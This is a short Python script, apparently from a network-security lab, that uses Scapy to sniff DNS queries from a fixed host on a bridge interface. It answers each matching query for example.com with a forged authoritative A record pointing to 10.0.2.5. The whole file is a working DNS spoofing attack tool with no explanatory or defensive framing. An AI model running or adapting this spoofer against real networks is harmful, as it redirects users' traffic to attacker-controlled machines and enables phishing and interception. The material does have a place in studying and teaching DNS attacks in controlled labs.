#!/usr/bin/env python3
from scapy.all import *
import sys

NS_NAME = "example.com"

def spoof_dns(pkt):
  if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
    print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))

    ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)

    udp = UDP(dport=pkt[UDP].sport, sport=53)

    Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                 ttl=259200, rdata='10.0.2.5')

    dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,  
                 qdcount=1, ancount=1, nscount=0, arcount=0, an=Anssec)

    spoofpkt = ip/udp/dns
    send(spoofpkt)

f = 'udp and src host 10.9.0.53 and dst port 53'
pkt = sniff(iface='br-485431723ab5', filter=f, prn=spoof_dns)
